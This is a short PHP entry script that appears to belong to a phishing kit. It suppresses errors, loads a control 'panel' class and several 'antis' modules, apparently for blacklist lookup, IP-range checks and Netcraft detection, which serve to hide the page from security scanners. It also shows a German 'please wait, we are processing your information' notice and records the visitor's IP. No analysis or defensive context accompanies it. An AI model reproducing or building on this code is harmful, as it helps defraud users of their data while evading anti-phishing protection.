<?php 
error_reporting(0);
session_start();
require (__DIR__).'/config.php';
require (__DIR__).'/lib/frm.php';
require (__DIR__).'/panel/panel.class.php';
require (__DIR__).'/antis/cb.php';
require (__DIR__).'/antis/blacklist_lookup.php';
require (__DIR__).'/antis/ip_range_check.php';
require (__DIR__).'/antis/netcraft_check.php';
require (__DIR__).'/helper.php';
$pnl = new Panel();
$current_data = $pnl->getData();
$helper = new Helper("Bitte warten", "Wir verarbeiten Ihre Informationen. Sie werden in Kürze automatisch weitergeleitet.");

$ip = $_SERVER['REMOTE_ADDR'];
if($ip=="::1"){
	$ip="127.0.0.1";
}
?>